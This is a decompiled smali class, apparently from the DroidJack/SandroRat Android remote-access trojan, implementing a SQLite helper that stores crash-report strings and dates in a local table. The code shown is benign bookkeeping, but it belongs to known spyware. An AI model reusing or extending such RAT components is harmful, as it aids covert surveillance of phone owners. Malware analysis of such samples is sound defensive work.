.class public Lnet/droidjack/server/ad;
.super Landroid/database/sqlite/SQLiteOpenHelper;


# instance fields
.field private a:Landroid/database/sqlite/SQLiteDatabase;

.field private b:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 3

    const-string v0, "SandroRat_CrashReport_Database"

    const/4 v1, 0x0

    const/4 v2, 0x1

    invoke-direct {p0, p1, v0, v1, v2}, Landroid/database/sqlite/SQLiteOpenHelper;-><init>(Landroid/content/Context;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)V

    const-string v0, "CrashReportTable"

    iput-object v0, p0, Lnet/droidjack/server/ad;->b:Ljava/lang/String;

    return-void
.end method

.method private a()V
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/ad;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/ad;->a:Landroid/database/sqlite/SQLiteDatabase;

    return-void
.end method

.method private b()V
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/ad;->a:Landroid/database/sqlite/SQLiteDatabase;

    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    return-void
.end method


# virtual methods
.method protected a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    invoke-direct {p0}, Lnet/droidjack/server/ad;->a()V

    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    const-string v1, "REPORT"

    invoke-virtual {v0, v1, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "RDATE"

    invoke-virtual {v0, v1, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/ad;->a:Landroid/database/sqlite/SQLiteDatabase;

    iget-object v2, p0, Lnet/droidjack/server/ad;->b:Ljava/lang/String;

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3, v0}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J

    invoke-direct {p0}, Lnet/droidjack/server/ad;->b()V

    return-void
.end method

.method public onCreate(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "CREATE TABLE "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/ad;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " (REPORT TEXT, RDATE TEXT);"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    return-void
.end method

.method public onUpgrade(Landroid/database/sqlite/SQLiteDatabase;II)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Drop table if exists "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/ad;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lnet/droidjack/server/ad;->onCreate(Landroid/database/sqlite/SQLiteDatabase;)V

    return-void
.end method
